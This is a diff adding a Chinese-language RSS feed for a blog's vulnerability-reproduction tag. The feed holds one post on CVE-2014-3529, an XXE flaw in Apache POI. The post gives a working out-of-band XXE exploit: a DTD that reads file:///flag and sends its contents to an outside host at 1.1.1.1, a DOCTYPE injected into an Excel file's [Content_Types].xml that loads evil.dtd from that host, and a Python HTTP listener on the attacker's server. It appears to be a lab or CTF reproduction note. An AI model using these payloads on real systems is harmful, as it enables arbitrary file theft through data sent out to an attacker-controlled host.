@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>漏洞复现 on Olist.213</title>
+    <link>https://olist213.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+    <description>Recent content in 漏洞复现 on Olist.213</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Mon, 17 Apr 2023 17:48:23 +0800</lastBuildDate><atom:link href="https://olist213.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CVE 2014 3529</title>
+      <link>https://olist213.github.io/posts/cve-2014-3529/</link>
+      <pubDate>Mon, 17 Apr 2023 17:48:23 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/cve-2014-3529/</guid>
+      <description>产品简介 Apache POI是Apache软件基金会的开放源码函式库，POI提供API给Java程序对Microsoft Office格式档案读和写的功能。
+漏洞概述 Apache POI 3.10.1 之前的 OPC SAX 设置允许远程攻击者通过 OpenXML 文件读取任意文件，该文件包含与 XML 外部实体 (XXE) 问题相关的 XML 外部实体声明和实体引用。
+影响范围 Apache POI&amp;lt;3.10.1
+利用流程 1、准备一个dtd文件，内容如下，ip为vps的ip地址：
+&amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt; &amp;lt;!ENTITY % int &amp;#34;&amp;lt;!ENTITY &amp;amp;#37; send SYSTEM &amp;#39;http://1.1.1.1/%file;&amp;#39;&amp;gt;&amp;#34;&amp;gt; 2、新建一个excel文件，修改后缀为zip，解压出来。
+向[Content_Types].xml添加内容
+&amp;lt;!DOCTYPE convert [ &amp;lt;!ENTITY % remote SYSTEM &amp;#34;http://1.1.1.1/evil.dtd&amp;#34;&amp;gt; %remote;%int;%send;]&amp;gt; 3、vps上开启监听
+sudo python3 -m http.server 80 4、上传文件到目标站点，返回文件名，解析下这个文件名即可，返回flag。
+修复建议 无
+参考 https://www.cnblogs.com/CabbageJun/p/15943080.html</description>
+    </item>
+    
+  </channel>
+</rss>
